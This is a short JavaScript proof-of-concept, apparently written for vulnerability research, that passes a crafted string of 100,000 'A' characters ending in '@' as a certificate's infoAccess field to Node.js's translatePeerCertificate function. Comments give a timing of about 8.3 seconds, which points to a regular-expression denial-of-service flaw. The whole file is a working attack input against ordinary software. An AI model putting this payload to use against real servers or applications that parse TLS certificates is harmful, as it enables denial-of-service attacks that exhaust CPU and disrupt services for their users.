const { translatePeerCertificate } = require("./_tls_common.js");

//Attack String :""+"A"*100000+"@"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "A";
}
str += "@";

const c = {
  issuerCertificate: null,
  infoAccess: str,
};
var result = translatePeerCertificate(c);

// real    0m8.310s
// user    0m8.289s
// sys     0m0.000s

//注释了大部分导入